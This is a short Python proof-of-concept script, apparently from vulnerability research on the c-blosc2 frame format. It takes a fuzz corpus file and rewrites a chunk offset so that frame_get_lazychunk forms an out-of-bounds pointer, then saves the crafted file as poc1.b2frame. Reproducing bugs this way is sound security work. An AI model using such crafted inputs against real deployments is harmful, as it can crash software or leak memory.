from pathlib import Path
src=Path('tests/fuzz/corpus/frame_simple-blosclz.b2frame')
d=bytearray(src.read_bytes())
h=int.from_bytes(d[11:15],'big')
c=int.from_bytes(d[39:47],'big')
off=h+c
# mutate first offset in memcpyed offsets chunk data, little-endian int64
# point beyond the end of the serialized frame so frame_get_lazychunk forms an OOB pointer.
d[off+32:off+40]=(len(d)).to_bytes(8,'little')
Path('/workspace/poc1.b2frame').write_bytes(d)
print(len(d), h, c, off)
